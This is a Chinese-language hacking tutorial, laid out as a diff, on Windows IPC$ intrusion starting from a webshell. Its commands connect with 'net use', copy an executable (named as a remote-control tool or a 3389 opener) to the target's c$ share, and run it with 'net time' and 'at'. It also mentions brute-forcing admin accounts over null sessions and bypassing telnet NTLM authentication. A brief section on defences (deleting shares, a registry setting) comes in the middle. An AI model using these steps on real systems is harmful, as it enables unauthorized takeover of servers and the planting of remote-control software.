@@ -1,0 +1,49 @@
+
+ipc入侵详解
+
+当你获得了一个webshell，并且提升了自己的权限时，是否就一定能进行远程连接呢？
+
+有时会苦于3389端口未开启而不得不终止自己的入侵，当你的webshell的ws组件未被删除时，
+
+或许可以
+若是ws组件被删除，虽然网上流传一段asp文件调用ws的代码，可是我没有成功过
+
+给出ipc命令的格式
+
+net use \\ip\ipc$ "pass" /user: "name"
+
+copy命令配合at,net time命令可以玩玩全全的拿下一台未开有3389的服务器
+
+假设服务器ip未192.168.1.1
+
+先进行ipc连接，然后copy gezi.exe \\192.168.1.1\c$
+
+再net time \\192.168.1.1 获取时间 ，假设为10:00
+
+再执行at \\192.168.1.1 10：01 c:\gezi.exe
+
+（注：这里的gezi.exe可以使远控，可以是开3389的程序，都行）
+
+如若运气好，可进行ipc空连接，可以进行枚举的方法对管理员账号进行破解
+
+防范的方法：
+
+net share ipc$ /del
+
+net share c$ /del 类推，用几个盘就执行几次
+
+禁止ipc空连接，可以修改注册表
+
+[hkey_local_machine\system\currentcontrolset\control\lsa]把restrict anonymous=dword的键值改为00000001，重启生效，最后net stop server /y 到这里ipc的漏洞算是补上了
+
+最后想接下telnet入侵，当连接了ipc,可以用netsvc命令开启telnet
+
+由于telnet危害巨大，所以telnet启用NTLM认证，不过几个简单的步骤就可以使他形同虚设
+
+首先 开始--程序--附件--命令提示符--右键--属性
+
+以其他用户身份运行前面打钩，输入administrator,密码留空就可以破解
+
+虽然是老技术了，可是dos下的入侵仍然是经典，说不定什么时候就用上了
+
+大家别喷我，一个一个字码出来可是很累的，没有功劳，也有苦劳
